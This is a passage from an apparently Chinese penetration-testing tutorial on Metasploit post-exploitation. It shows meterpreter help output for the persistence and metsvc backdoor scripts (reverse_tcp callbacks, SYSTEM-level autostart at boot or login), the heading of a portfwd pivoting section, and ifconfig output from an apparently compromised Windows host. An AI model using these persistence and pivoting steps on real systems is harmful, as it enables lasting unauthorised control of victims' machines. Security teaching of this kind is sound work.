</span></span><span style=display:flex><span>    <span style=color:#f92672>-</span>P <span style=color:#f92672>&lt;</span>opt<span style=color:#f92672>&gt;</span>  <span style=color:#960050;background-color:#1e0010>指定</span>payload <span style=color:#960050;background-color:#1e0010>，默认是</span> windows<span style=color:#f92672>/</span>meterpreter<span style=color:#f92672>/</span>reverse_tcp<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>-</span>S        <span style=color:#960050;background-color:#1e0010>在启动时作为服务自动启动代理（具有</span>SYSTEM权限<span style=color:#960050;background-color:#1e0010>）</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>-</span>T <span style=color:#f92672>&lt;</span>opt<span style=color:#f92672>&gt;</span>  <span style=color:#960050;background-color:#1e0010>使用模板</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>-</span>U        <span style=color:#960050;background-color:#1e0010>用户登录时自动启动代理</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>-</span>X        <span style=color:#960050;background-color:#1e0010>系统引导时自动启动代理</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>-</span>h        <span style=color:#960050;background-color:#1e0010>帮助菜单</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>-</span>i <span style=color:#f92672>&lt;</span>opt<span style=color:#f92672>&gt;</span>  <span style=color:#960050;background-color:#1e0010>间隔多少秒像控制端发送连接</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>-</span>p <span style=color:#f92672>&lt;</span>opt<span style=color:#f92672>&gt;</span>  <span style=color:#960050;background-color:#1e0010>被控端要连接的端口</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>-</span>r <span style=color:#f92672>&lt;</span>opt<span style=color:#f92672>&gt;</span>  <span style=color:#960050;background-color:#1e0010>被控端要连接的</span>IP地址
</span></span></code></pre></td></tr></table></div></div><blockquote><p>metsvc</p></blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>meterpreter &gt; run metsvc -h
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
</span></span><span style=display:flex><span>[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>OPTIONS:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    -A        自动启动一个匹配 exploit/multi/handler来连接服务
</span></span><span style=display:flex><span>    -h        帮助菜单
</span></span><span style=display:flex><span>    -r        卸载服务
</span></span></code></pre></td></tr></table></div></div><p>它是一个正向的连接，不适用于复杂的内网环境</p><h2 id=0x04-端口转发之portfwd详解>0x04 端口转发之portfwd详解</h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">101
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">102
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">103
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">104
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>meterpreter &gt; ifconfig
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Interface  1
</span></span><span style=display:flex><span>============
</span></span><span style=display:flex><span>Name         : Software Loopback Interface 1
</span></span><span style=display:flex><span>Hardware MAC : 00:00:00:00:00:00
</span></span><span style=display:flex><span>MTU          : 4294967295
</span></span><span style=display:flex><span>IPv4 Address : 127.0.0.1
</span></span><span style=display:flex><span>IPv4 Netmask : 255.0.0.0
</span></span><span style=display:flex><span>IPv6 Address : ::1
</span></span><span style=display:flex><span>IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Interface 11
</span></span><span style=display:flex><span>============
</span></span><span style=display:flex><span>Name         : Broadcom NetXtreme Gigabit Ethernet
</span></span><span style=display:flex><span>Hardware MAC : c8:1f:66:f2:a9:6b
</span></span><span style=display:flex><span>MTU          : 1500
</span></span><span style=display:flex><span>IPv4 Address : 10.159.63.178
</span></span><span style=display:flex><span>IPv4 Netmask : 255.255.255.128
</span></span><span style=display:flex><span>IPv6 Address : fe80::4d1c:361b:b5e7:5894
</span></span><span style=display:flex><span>IPv6 Netmask : ffff:ffff:ffff:ffff::
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Interface 12
</span></span><span style=display:flex><span>============
</span></span><span style=display:flex><span>Name         : Microsoft ISATAP Adapter
</span></span><span style=display:flex><span>Hardware MAC : 00:00:00:00:00:00
</span></span><span style=display:flex><span>MTU          : 1280
</span></span><span style=display:flex><span>IPv6 Address : fe80::5efe:a9f:3fb2
</span></span><span style=display:flex><span>IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Interface 13
</span></span><span style=display:flex><span>============
</span></span><span style=display:flex><span>Name         : Broadcom NetXtreme Gigabit Ethernet #2
</span></span><span style=display:flex><span>Hardware MAC : c8:1f:66:f2:a9:6c
</span></span><span style=display:flex><span>MTU          : 1500
</span></span><span style=display:flex><span>IPv4 Address : 169.254.191.36
</span></span><span style=display:flex><span>IPv4 Netmask : 255.255.0.0
</span></span><span style=display:flex><span>IPv6 Address : fe80::b805:65eb:7c4d:bf24
</span></span><span style=display:flex><span>IPv6 Netmask : ffff:ffff:ffff:ffff::
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Interface 14
</span></span><span style=display:flex><span>============
</span></span><span style=display:flex><span>Name         : Microsoft ISATAP Adapter #2
</span></span><span style=display:flex><span>Hardware MAC : 00:00:00:00:00:00
</span></span><span style=display:flex><span>MTU          : 1280
</span></span><span style=display:flex><span>IPv6 Address : fe80::5efe:a9fe:bf24
</span></span><span style=display:flex><span>IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Interface 15
</span></span><span style=display:flex><span>============
</span></span><span style=display:flex><span>Name         : Broadcom NetXtreme Gigabit Ethernet #3
</span></span><span style=display:flex><span>Hardware MAC : c8:1f:66:f2:a9:6d
</span></span><span style=display:flex><span>MTU          : 1500
</span></span><span style=display:flex><span>IPv4 Address : 169.254.112.31
</span></span><span style=display:flex><span>IPv4 Netmask : 255.255.0.0
</span></span><span style=display:flex><span>IPv6 Address : fe80::1d1d:79:e7f1:701f
</span></span><span style=display:flex><span>IPv6 Netmask : ffff:ffff:ffff:ffff::
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Interface 16
</span></span><span style=display:flex><span>============
</span></span><span style=display:flex><span>Name         : Microsoft ISATAP Adapter #3
</span></span><span style=display:flex><span>Hardware MAC : 00:00:00:00:00:00
</span></span><span style=display:flex><span>MTU          : 1280
</span></span><span style=display:flex><span>IPv6 Address : fe80::5efe:a9fe:701f
</span></span><span style=display:flex><span>IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Interface 17
</span></span><span style=display:flex><span>============
</span></span><span style=display:flex><span>Name         : Broadcom NetXtreme Gigabit Ethernet #4
</span></span><span style=display:flex><span>Hardware MAC : c8:1f:66:f2:a9:6e
</span></span><span style=display:flex><span>MTU          : 1500
</span></span><span style=display:flex><span>IPv4 Address : 10.159.191.178
</span></span><span style=display:flex><span>IPv4 Netmask : 255.255.255.128
</span></span><span style=display:flex><span>IPv4 Address : ***.***.***.***
</span></span><span style=display:flex><span>IPv4 Netmask : 255.255.255.255
</span></span><span style=display:flex><span>IPv6 Address : fe80::35ec:8852:7f1f:321d
</span></span><span style=display:flex><span>IPv6 Netmask : ffff:ffff:ffff:ffff::
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Interface 18
</span></span><span style=display:flex><span>============
</span></span><span style=display:flex><span>Name         : Microsoft ISATAP Adapter #4
</span></span><span style=display:flex><span>Hardware MAC : 00:00:00:00:00:00
</span></span><span style=display:flex><span>MTU          : 1280
</span></span><span style=display:flex><span>IPv6 Address : fe80::5efe:a9f:bfb2
</span></span><span style=display:flex><span>IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
</span></span><span style=display:flex><span>IPv6 Address : fe80::200:5efe:7b67:7168
</span></span><span style=display:flex><span>IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Interface 21
</span></span><span style=display:flex><span>============
</span></span><span style=display:flex><span>Name         : Microsoft 6to4 Adapter
</span></span><span style=display:flex><span>Hardware MAC : 00:00:00:00:00:00
</span></span><span style=display:flex><span>MTU          : 1280
</span></span><span style=display:flex><span>IPv6 Address : 2002:7b67:7168::7b67:7168
</span></span><span style=display:flex><span>IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
